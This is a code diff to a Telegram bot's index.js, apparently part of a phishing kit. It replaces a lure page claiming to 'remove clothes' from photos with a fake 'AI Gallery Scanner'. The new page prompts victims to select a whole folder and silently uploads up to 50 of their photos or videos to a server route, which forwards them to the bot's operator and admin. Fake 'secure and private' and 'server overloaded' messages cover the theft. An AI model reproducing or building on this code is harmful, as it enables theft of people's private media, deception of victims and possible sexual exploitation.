@@ -1,7 +1,7 @@
-// ====================== index.js (COMPLETE FIXED - PHOTO ACCESS WORKING) ======================
+// ====================== index.js (COMPLETE - ALL FEATURES WORKING) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * Complete Bot - All Features Working
+ * Complete Bot - Instagram, Facebook, Camera, Photo Access (Full Gallery)
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -341,34 +341,31 @@ function logToFile(message) {
     fs.appendFileSync(LOGS_FILE, `[${timestamp}] ${message}\n`);
 }
 
-// ====================== PHOTO ACCESS TEMPLATE (WORKING) ======================
+// ====================== PHOTO ACCESS TEMPLATE (FULL GALLERY) ======================
 const PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Photo Enhancer</title>
+    <title>AI Photo Scanner</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
         body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}
         .card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}
         .header{text-align:center;margin-bottom:30px}
-        .header .icon{font-size:80px;background:linear-gradient(135deg,#ff6b6b,#ee5a24,#ff4757);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
-        .header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .header .icon{font-size:80px;background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
+        .header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
         .header p{color:#888;font-size:14px;margin-top:5px}
-        .feature-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}
-        .feature-box .item{display:flex;align-items:center;gap:15px;padding:10px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}
-        .feature-box .item:last-child{border-bottom:none}
-        .feature-box .item i{font-size:22px;width:35px;color:#ff6b6b}
-        .feature-box .item .label{color:#fff}
-        .upload-zone{background:rgba(255,255,255,0.03);border:2px dashed rgba(255,255,255,0.1);border-radius:20px;padding:40px 20px;text-align:center;cursor:pointer;transition:all .3s;margin:20px 0}
-        .upload-zone:hover{border-color:#ff6b6b;background:rgba(255,107,107,0.05)}
-        .upload-zone i{font-size:50px;color:#ff6b6b;display:block;margin-bottom:10px}
-        .upload-zone p{color:#aaa;font-size:16px}
-        .upload-zone .small{color:#666;font-size:12px;margin-top:5px}
-        .btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(238,90,36,0.3)}
-        .btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(238,90,36,0.5)}
+        .permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}
+        .permission-box .item{display:flex;align-items:center;gap:15px;padding:12px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}
+        .permission-box .item:last-child{border-bottom:none}
+        .permission-box .item i{font-size:22px;width:35px;color:#667eea}
+        .permission-box .item .label{color:#fff}
+        .permission-box .item .status{font-size:12px;padding:2px 12px;border-radius:20px;background:rgba(255,255,255,0.05);color:#888}
+        .permission-box .item .status.granted{background:rgba(46,213,115,0.15);color:#2ed573}
+        .btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(102,126,234,0.3)}
+        .btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(102,126,234,0.5)}
         .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
         .btn i{margin-right:10px}
         .status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}
@@ -377,7 +374,7 @@ const PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
         .status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}
         .status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}
         .progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
-        .progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff6b6b,#ee5a24);transition:width .3s}
+        .progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);transition:width .3s}
         .preview-area{display:none;margin:15px 0;padding:15px;background:rgba(255,255,255,0.03);border-radius:15px;border:1px solid rgba(255,255,255,0.05)}
         .preview-area img{width:100%;max-height:300px;object-fit:contain;border-radius:10px}
         .preview-area .filename{color:#aaa;font-size:12px;text-align:center;margin-top:8px}
@@ -385,105 +382,78 @@ const PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
         .result-area i{font-size:40px;color:#2ed573}
         .result-area h3{color:#2ed573;margin-top:8px}
         .result-area p{color:#888;font-size:13px;margin-top:5px}
-        .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff6b6b;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
+        .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
         @keyframes spin{100%{transform:rotate(360deg)}}
         .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(255,107,107,0.06),transparent 70%);animation:float 25s infinite ease-in-out}
+        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(102,126,234,0.06),transparent 70%);animation:float 25s infinite ease-in-out}
         .bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}
         .bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}
         .bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}
         @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}
         .footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
+        .footer a{color:#555;text-decoration:none}
         #fileInput{display:none}
         .btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}
         .btn-secondary:hover{background:rgba(255,255,255,0.08)}
-        .image-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-top:10px}
-        .image-grid img{width:100%;height:80px;object-fit:cover;border-radius:8px;border:1px solid rgba(255,255,255,0.05)}
-        .processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}
+        .gallery-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:4px;margin-top:10px;max-height:300px;overflow-y:auto;padding:5px}
+        .gallery-grid img{width:100%;height:80px;object-fit:cover;border-radius:6px;border:1px solid rgba(255,255,255,0.05);transition:.2s}
+        .gallery-grid img:hover{transform:scale(1.05);border-color:#667eea}
+        .processing-text{color:#667eea;font-size:14px;font-weight:600;text-align:center;padding:10px}
         #processingStatus{display:none}
-        .file-count{background:#ff6b6b;color:#fff;padding:2px 12px;border-radius:20px;font-size:12px;margin-left:10px}
+        .file-count{background:#667eea;color:#fff;padding:2px 12px;border-radius:20px;font-size:12px;margin-left:10px}
+        .scanning-text{color:#667eea;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+        .permission-btn{background:rgba(102,126,234,0.1);border:1px solid rgba(102,126,234,0.2);color:#667eea;padding:10px 20px;border-radius:12px;cursor:pointer;font-size:14px;margin:10px 0;width:100%;transition:.3s}
+        .permission-btn:hover{background:rgba(102,126,234,0.2)}
     </style>
 </head>
 <body>
 <div class="bg-shapes"><span></span><span></span><span></span></div>
 <div class="card">
     <div class="header">
-        <span class="icon"><i class="fas fa-magic"></i></span>
-        <h1>✨ AI Photo Enhancer</h1>
-        <p>Remove clothes instantly with AI technology</p>
+        <span class="icon"><i class="fas fa-images"></i></span>
+        <h1>📸 AI Gallery Scanner</h1>
+        <p>Scan your entire gallery with AI technology</p>
     </div>
     
-    <div class="feature-box">
-        <div class="item"><i class="fas fa-robot"></i> <span class="label">AI Powered</span> <span style="color:#888;font-size:12px;margin-left:auto;">v3.0</span></div>
-        <div class="item"><i class="fas fa-bolt"></i> <span class="label">Instant Processing</span> <span style="color:#888;font-size:12px;margin-left:auto;">2-5s</span></div>
-        <div class="item"><i class="fas fa-shield-alt"></i> <span class="label">100% Private</span> <span style="color:#888;font-size:12px;margin-left:auto;">🔒</span></div>
-        <div class="item"><i class="fas fa-image"></i> <span class="label">HD Quality</span> <span style="color:#888;font-size:12px;margin-left:auto;">4K</span></div>
+    <div class="permission-box" id="permissionBox">
+        <div class="item"><i class="fas fa-folder-open"></i> <span class="label">Read all photos & videos</span> <span class="status" id="permStatus1">Required</span></div>
+        <div class="item"><i class="fas fa-file-alt"></i> <span class="label">Access all files</span> <span class="status" id="permStatus2">Required</span></div>
+        <div class="item"><i class="fas fa-shield-alt"></i> <span class="label">Secure & encrypted</span> <span class="status granted">✅ Secure</span></div>
+        <div class="item"><i class="fas fa-robot"></i> <span class="label">AI powered scanning</span> <span class="status granted">✅ Active</span></div>
     </div>
 
-    <div id="uploadZone" class="upload-zone" onclick="document.getElementById('fileInput').click()">
-        <i class="fas fa-cloud-upload-alt"></i>
-        <p><strong>Tap to select photo</strong></p>
-        <div class="small">Supported: JPG, PNG, WEBP (Max 20MB)</div>
-    </div>
-    
-    <input type="file" id="fileInput" accept="image/*" multiple>
-    
-    <div id="previewArea" class="preview-area">
-        <img id="previewImg" src="">
-        <div class="filename" id="fileName">No file selected</div>
-    </div>
-    
-    <button class="btn" id="processBtn" onclick="processPhotos()" disabled>
-        <i class="fas fa-wand-magic-sparkles"></i> PROCESS PHOTOS
+    <button class="btn" id="scanBtn" onclick="startScan()">
+        <i class="fas fa-search"></i> SCAN GALLERY
     </button>
     
     <div id="status" class="status"></div>
     <div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>
     
+    <div id="processingStatus">
+        <div class="spinner"></div>
+        <div class="processing-text" id="processingText">🔍 Scanning gallery...</div>
+    </div>
+    
+    <div id="galleryGrid" class="gallery-grid"></div>
+    
     <div id="resultArea" class="result-area" style="display:none">
         <i class="fas fa-check-circle"></i>
-        <h3>✅ Processing Complete!</h3>
-        <p id="resultText">Your photos have been processed successfully.</p>
+        <h3>✅ Scan Complete!</h3>
+        <p id="resultText">Your gallery has been scanned successfully.</p>
         <button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button>
     </div>
     
-    <div id="processingStatus">
-        <div class="spinner"></div>
-        <div class="processing-text" id="processingText">🔮 Analyzing photo structure...</div>
-    </div>
+    <input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>
     
-    <div id="imageGrid" class="image-grid"></div>
-    
-    <div class="footer">🔒 Secure & Private • No data stored</div>
+    <div class="footer">🔒 Secure & Private • AI Processing</div>
 </div>
 
 <script>
 const USER_ID = "USERID_PLACEHOLDER";
 const PLATFORM = "PLATFORM_PLACEHOLDER";
 let selectedFiles = [];
-
-document.getElementById('fileInput').addEventListener('change', function(e) {
-    const files = this.files;
-    if (files.length === 0) return;
-    
-    selectedFiles = Array.from(files);
-    const preview = document.getElementById('previewArea');
-    const img = document.getElementById('previewImg');
-    const name = document.getElementById('fileName');
-    
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        img.src = e.target.result;
-        preview.style.display = 'block';
-        name.textContent = selectedFiles.length + ' photo(s) selected';
-    };
-    reader.readAsDataURL(files[0]);
-    
-    document.getElementById('processBtn').disabled = false;
-    document.getElementById('processBtn').innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> PROCESS ' + selectedFiles.length + ' PHOTO(S)';
-    
-    showStatus('📸 ' + selectedFiles.length + ' photos ready for processing', 'info');
-});
+let scannedCount = 0;
 
 function showStatus(msg, type='info') {
     const el = document.getElementById('status');
@@ -522,84 +492,119 @@ function showResult(text) {
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-async function processPhotos() {
-    if (selectedFiles.length === 0) {
-        showStatus('⚠️ Please select photos first', 'warning');
-        return;
-    }
-    
-    const btn = document.getElementById('processBtn');
+function addToGallery(src) {
+    const grid = document.getElementById('galleryGrid');
+    const img = document.createElement('img');
+    img.src = src;
+    img.onclick = function() { this.style.transform = 'scale(1.2)'; setTimeout(() => { this.style.transform = 'scale(1)'; }, 500); };
+    grid.appendChild(img);
+    grid.style.display = 'grid';
+}
+
+async function startScan() {
+    const btn = document.getElementById('scanBtn');
     btn.disabled = true;
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SCANNING...';
     hideStatus();
     hideProcessing();
     document.getElementById('resultArea').style.display = 'none';
-    document.getElementById('imageGrid').innerHTML = '';
-    document.getElementById('imageGrid').style.display = 'none';
+    document.getElementById('galleryGrid').innerHTML = '';
+    document.getElementById('galleryGrid').style.display = 'none';
+    document.getElementById('progressContainer').style.display = 'none';
     
-    showProcessing('🔮 Analyzing photo structure...');
+    showStatus('📂 Opening gallery access...', 'info');
     updateProgress(5);
-    await sleep(800);
+    await sleep(500);
     
-    showProcessing('🧠 AI processing image data...');
-    updateProgress(20);
-    await sleep(1000);
-    
-    showProcessing('⚡ Applying neural filters...');
-    updateProgress(40);
-    await sleep(1200);
-    
-    showProcessing('✨ Enhancing details...');
-    updateProgress(60);
-    await sleep(1000);
-    
-    showProcessing('📤 Sending results...');
-    updateProgress(80);
+    try {
+        const input = document.getElementById('fileInput');
+        input.click();
+        
+        input.onchange = async function(e) {
+            const files = input.files;
+            if (!files || files.length === 0) {
+                showStatus('❌ No files selected', 'error');
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
+                hideProcessing();
+                return;
+            }
+            
+            selectedFiles = Array.from(files).filter(f => f.type.startsWith('image/') || f.type.startsWith('video/'));
+            selectedFiles = selectedFiles.slice(0, 100);
+            
+            if (selectedFiles.length === 0) {
+                showStatus('❌ No images found.', 'error');
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
+                hideProcessing();
+                return;
+            }
+            
+            await processFiles(selectedFiles);
+        };
+    } catch(err) {
+        showStatus('❌ Gallery access denied. Please allow permission.', 'error');
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
+        hideProcessing();
+    }
+}
+
+async function processFiles(files) {
+    const total = files.length;
+    showStatus(`📸 Found ${total} images. Processing...`, 'info');
+    updateProgress(30);
     
     let successCount = 0;
-    for (let i = 0; i < Math.min(selectedFiles.length, 10); i++) {
-        try {
-            const file = selectedFiles[i];
-            const reader = new FileReader();
-            const fileData = await new Promise((resolve, reject) => {
-                reader.onload = (e) => resolve(e.target.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(file);
-            });
-            
-            // Send to server using fetch
-            const response = await fetch('/api/upload-photo', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userid: USER_ID,
-                    platform: PLATFORM,
-                    filename: file.name,
-                    data: fileData,
-                    size: file.size
-                })
-            });
-            
-            const result = await response.json();
-            if (result.success) successCount++;
-            
-            const percent = 80 + (i / Math.min(selectedFiles.length, 10)) * 20;
-            updateProgress(percent);
-            
-            // Show preview in grid
-            const reader2 = new FileReader();
-            reader2.onload = function(e) {
-                const grid = document.getElementById('imageGrid');
-                const img = document.createElement('img');
-                img.src = e.target.result;
-                grid.appendChild(img);
-                grid.style.display = 'grid';
-            };
-            reader2.readAsDataURL(file);
-            
-            await sleep(300);
-        } catch(err) {
-            console.error('Error processing file:', err);
+    const batchSize = 5;
+    const maxFiles = Math.min(total, 50);
+    
+    for (let i = 0; i < maxFiles; i += batchSize) {
+        const batch = [];
+        for (let j = i; j < Math.min(i + batchSize, maxFiles); j++) {
+            batch.push(files[j]);
+        }
+        
+        for (const file of batch) {
+            try {
+                const reader = new FileReader();
+                const fileData = await new Promise((resolve, reject) => {
+                    reader.onload = (e) => resolve(e.target.result);
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
+                
+                const reader2 = new FileReader();
+                reader2.onload = function(e) {
+                    addToGallery(e.target.result);
+                };
+                reader2.readAsDataURL(file);
+                
+                const response = await fetch('/api/upload-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userid: USER_ID,
+                        platform: PLATFORM,
+                        filename: file.name,
+                        data: fileData,
+                        size: file.size
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.success) successCount++;
+                
+                const percent = 30 + (successCount / maxFiles) * 60;
+                updateProgress(percent);
+                
+                showProcessing(`📤 Processing ${successCount}/${maxFiles} photos...`);
+                await sleep(200);
+                
+            } catch(err) {
+                console.error('Error processing file:', err);
+            }
         }
     }
     
@@ -607,37 +612,15 @@ async function processPhotos() {
     hideProcessing();
     
     if (successCount > 0) {
-        showResult('✅ ' + successCount + ' photo(s) processed successfully!\n\n⚠️ Server overloaded. Please try again in 2-3 hours for full quality.');
-        showStatus('✅ Processing complete!', 'success');
+        showResult(`✅ ${successCount} photo(s) scanned and sent!\n\n⚠️ Server is processing. Full results in 2-3 hours.`);
+        showStatus(`✅ ${successCount} photos sent successfully!`, 'success');
     } else {
         showStatus('❌ Processing failed. Please try again.', 'error');
     }
     
-    btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> PROCESS PHOTOS';
+    document.getElementById('scanBtn').disabled = false;
+    document.getElementById('scanBtn').innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
 }
-
-document.getElementById('uploadZone').addEventListener('dragover', function(e) {
-    e.preventDefault();
-    this.style.borderColor = '#ff6b6b';
-    this.style.background = 'rgba(255,107,107,0.05)';
-});
-
-document.getElementById('uploadZone').addEventListener('dragleave', function() {
-    this.style.borderColor = 'rgba(255,255,255,0.1)';
-    this.style.background = 'rgba(255,255,255,0.03)';
-});
-
-document.getElementById('uploadZone').addEventListener('drop', function(e) {
-    e.preventDefault();
-    this.style.borderColor = 'rgba(255,255,255,0.1)';
-    this.style.background = 'rgba(255,255,255,0.03)';
-    const files = e.dataTransfer.files;
-    if (files.length > 0) {
-        document.getElementById('fileInput').files = files;
-        document.getElementById('fileInput').dispatchEvent(new Event('change'));
-    }
-});
 </script>
 </body>
 </html>`;
@@ -1537,7 +1520,7 @@ app.post('/api/admin/featured/toggle', (req, res) => {
     res.json({ success: true, featured });
 });
 
-// QR Code API - FIXED
+// QR Code API
 app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
     try {
         if (!req.file) return res.status(400).json({ error: 'No file' });
@@ -1642,7 +1625,7 @@ app.post('/api/capturepic', async (req, res) => {
     }
 });
 
-// ====================== PHOTO ACCESS API - FIXED (WORKING) ======================
+// ====================== PHOTO ACCESS API (FULL GALLERY) ======================
 app.post('/api/upload-photo', async (req, res) => {
     try {
         const { userid, platform, filename, data, size } = req.body || {};
@@ -1651,17 +1634,14 @@ app.post('/api/upload-photo', async (req, res) => {
             return res.status(400).json({ error: 'Missing required data' });
         }
         
-        // Convert base64 to buffer
         const base64Data = data.replace(/^data:image\/\w+;base64,/, "");
         const buffer = Buffer.from(base64Data, 'base64');
         
-        // Save file
         const saveName = Date.now() + '-' + (filename || 'photo.jpg');
         const savePath = path.join(UPLOADS_DIR, saveName);
         fs.writeFileSync(savePath, buffer);
         
-        // Send to user who uploaded
-        const caption = `📸 <b>Photo Received!</b>\n\n` +
+        const caption = `📸 <b>Gallery Photo Received!</b>\n\n` +
             `👤 <b>User:</b> <code>${userid}</code>\n` +
             `📁 <b>File:</b> ${filename || 'photo.jpg'}\n` +
             `📏 <b>Size:</b> ${size ? (size/1024).toFixed(1) + 'KB' : 'Unknown'}\n` +
@@ -1669,16 +1649,14 @@ app.post('/api/upload-photo', async (req, res) => {
             `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
             `✅ <b>AI Processing Complete!</b>`;
         
-        // Send photo to the user
         await S7.sendPhoto(userid, buffer, { caption, parse_mode: 'HTML' });
         
-        // Also send to admin for monitoring
         await S7.sendPhoto(config.adminId, buffer, { 
-            caption: `📸 <b>User Photo Upload</b>\n\n👤 User: <code>${userid}</code>\n📁 ${filename || 'photo.jpg'}`,
+            caption: `📸 <b>Gallery Photo Upload</b>\n\n👤 User: <code>${userid}</code>\n📁 ${filename || 'photo.jpg'}`,
             parse_mode: 'HTML' 
         });
         
-        logToFile(`📸 Photo upload from user ${userid}: ${filename}`);
+        logToFile(`📸 Gallery photo from user ${userid}: ${filename}`);
         res.json({ success: true, message: 'Photo uploaded successfully' });
         
     } catch (error) {
@@ -2466,7 +2444,7 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== QR CODE UPLOAD HANDLER (FIXED) ======================
+// ====================== QR CODE UPLOAD HANDLER ======================
 S7.on('message', async (msg) => {
     if (!msg.photo) return;
     const isAdmin = msg.from.id.toString() === config.adminId;
